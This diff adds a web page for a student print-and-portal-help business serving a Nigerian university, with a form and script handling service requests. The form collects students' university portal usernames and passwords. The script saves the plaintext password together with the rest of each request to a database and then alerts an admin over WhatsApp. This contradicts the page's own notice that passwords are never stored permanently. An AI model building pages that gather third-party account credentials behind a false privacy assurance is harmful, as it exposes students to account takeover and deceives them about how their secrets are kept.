@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Student Portal Assistance - Unilesh Print Hub</title>
+    <meta name="description" content="Need help with your Unilesa student portal? Exam card, library pass, or login issues? We've got your back.">
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <link rel="manifest" href="../manifest.json">
+    <meta name="theme-color" content="#0a1f44">
+    <!-- iOS Mobile Features -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="PrintHub">
+    <link rel="apple-touch-icon" href="../assets/images/logo.png">
+</head>
+<body class="watermark-bg">
+
+    <header>
+        <div class="container">
+            <div class="logo">
+                <a href="../">
+                    <img src="../assets/images/logo.png" alt="Unilesh Print Hub Logo">
+                    Unilesh Print Hub
+                </a>
+                <span>powered by AfriNet Hub</span>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="../order/">Print Now</a></li>
+                    <li><a href="../portal/" class="active">Portal Services</a></li>
+                    <li><a href="../news/">Latest News</a></li>
+                    <li><a href="../partners/">Partners</a></li>
+                    <li><a href="../about/">About Us</a></li>
+                </ul>
+            </nav>
+            <button id="theme-toggle">Toggle Theme</button>
+        </div>
+    </header>
+
+    <main class="container">
+        <section class="page-header">
+            <h1>Student Portal Assistance</h1>
+            <p>Forgot your portal password? Need your exam card fast? We've got your back.</p>
+        </section>
+
+        <form id="portal-form" class="card form-card">
+            <div class="disclaimer">
+                <p><strong>Note:</strong> Your privacy is our priority. All submitted information is handled securely and used only for your requested service. Portal passwords are never stored permanently.</p>
+            </div>
+
+            <div class="form-grid">
+                <div class="form-group">
+                    <label for="full-name">Full Name</label>
+                    <input type="text" id="full-name" placeholder="As seen on your portal" required>
+                </div>
+                <div class="form-group">
+                    <label for="matric-number">Matriculation Number</label>
+                    <input type="text" id="matric-number" placeholder="Enter your Matric No." required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="phone-number">WhatsApp Phone Number</label>
+                <input type="tel" id="phone-number" placeholder="e.g. 08012345678" required>
+            </div>
+
+            <div class="form-grid">
+                <div class="form-group">
+                    <label for="department">Department</label>
+                    <select id="department" required>
+                        <option value="">Select Department</option>
+                        <option value="Science">Science</option>
+                        <option value="Arts">Arts</option>
+                        <option value="Engineering">Engineering</option>
+                        <option value="Law">Law</option>
+                        <option value="Medicine">Medicine</option>
+                        <option value="Education">Education</option>
+                        <option value="Social Sciences">Social Sciences</option>
+                        <option value="Management Sciences">Management Sciences</option>
+                        <option value="Agriculture">Agriculture</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="level">Level</label>
+                    <select id="level" required>
+                        <option value="">Select Level</option>
+                        <option value="100L">100L</option>
+                        <option value="200L">200L</option>
+                        <option value="300L">300L</option>
+                        <option value="400L">400L</option>
+                        <option value="500L">500L</option>
+                        <option value="Postgraduate">Postgraduate</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="service">Service Requested</label>
+                <select id="service" required>
+                    <option value="">Choose Service</option>
+                    <option value="Exam Card">Exam Card Retrieval</option>
+                    <option value="Library Pass">Library Pass</option>
+                    <option value="Portal Login Assistance">Portal Login Assistance</option>
+                    <option value="Result Checking">Result Checking</option>
+                    <option value="Course Registration">Course Registration</option>
+                    <option value="Other">Other</option>
+                </select>
+            </div>
+
+            <div class="form-grid">
+                <div class="form-group">
+                    <label for="portal-user">Unilesa Portal Username/Email</label>
+                    <input type="text" id="portal-user" placeholder="Enter username" required>
+                </div>
+                <div class="form-group">
+                    <label for="portal-pass">Unilesa Portal Password</label>
+                    <div class="password-input">
+                        <input type="password" id="portal-pass" placeholder="Enter password" required>
+                        <button type="button" id="toggle-pass" class="toggle-password">Show</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="notes">Additional Details</label>
+                <textarea id="notes" placeholder="Anything else we should know?"></textarea>
+            </div>
+
+            <button type="submit" class="cta-button" id="submit-portal">Submit Request</button>
+        </form>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-section">
+                    <p>&copy; 2024 Unilesh Print Hub (powered by AfriNet Hub). All Rights Reserved.</p>
+                    <p>Serving the <strong>University of Ilesha (Unilesa)</strong> community.</p>
+                </div>
+                <div class="footer-section university-links">
+                    <h4>University Portals</h4>
+                    <a href="https://unilesa.edu.ng" target="_blank" rel="noopener noreferrer">Official Unilesa Site</a>
+                    <a href="https://admissions.unilesa.edu.ng" target="_blank" rel="noopener noreferrer">Admissions Portal</a>
+                    <a href="https://unilesaservices.com.ng" target="_blank" rel="noopener noreferrer">Student Services Hub</a>
+                </div>
+                <div class="footer-section legal-links">
+                    <h4>Legal</h4>
+                    <a href="../privacy/">Privacy Policy</a>
+                    <a href="../terms/">Terms of Service</a>
+                    <a href="../refund/">Refund Policy</a>
+                    <a href="../about/">About</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Firebase SDKs -->
+    <script type="module" src="../assets/js/database.js"></script>
+    <script src="../assets/js/app.js"></script>
+
+    <script type="module">
+        document.addEventListener('DOMContentLoaded', () => {
+            const checkDeps = setInterval(() => {
+                if (window.savePortalRequest) {
+                    clearInterval(checkDeps);
+                    initPortalPage();
+                }
+            }, 100);
+        });
+
+        function initPortalPage() {
+            const form = document.getElementById('portal-form');
+            const submitBtn = document.getElementById('submit-portal');
+            const togglePassBtn = document.getElementById('toggle-pass');
+            const passwordInput = document.getElementById('portal-pass');
+
+            togglePassBtn.addEventListener('click', () => {
+                const isPassword = passwordInput.type === 'password';
+                passwordInput.type = isPassword ? 'text' : 'password';
+                togglePassBtn.textContent = isPassword ? 'Hide' : 'Show';
+            });
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const requestData = {
+                    fullName: document.getElementById('full-name').value,
+                    matricNumber: document.getElementById('matric-number').value,
+                    phoneNumber: document.getElementById('phone-number').value,
+                    department: document.getElementById('department').value,
+                    level: document.getElementById('level').value,
+                    serviceRequested: document.getElementById('service').value,
+                    portalUsername: document.getElementById('portal-user').value,
+                    portalPassword: document.getElementById('portal-pass').value,
+                    notes: document.getElementById('notes').value,
+                    status: 'Pending',
+                    timestamp: new Date().toISOString()
+                };
+
+                try {
+                    submitBtn.disabled = true;
+                    submitBtn.textContent = 'Submitting Request...';
+                    await window.savePortalRequest(requestData);
+                    
+                    const message = `New Portal Assistance Request!\n\n` +
+                                    `Student: ${requestData.fullName}\n` +
+                                    `Matric No: ${requestData.matricNumber}\n` +
+                                    `Service: ${requestData.serviceRequested}\n` +
+                                    `Phone: ${requestData.phoneNumber}`;
+                    
+                    const whatsappUrl = `https://wa.me/2348022140329?text=${encodeURIComponent(message)}`;
+                    alert("Request submitted successfully! Redirecting to WhatsApp to notify the admin.");
+                    window.open(whatsappUrl, '_blank');
+                    form.reset();
+                } catch (error) {
+                    alert("Oops! Something went wrong. Please try again.");
+                } finally {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Submit Request';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
+
+
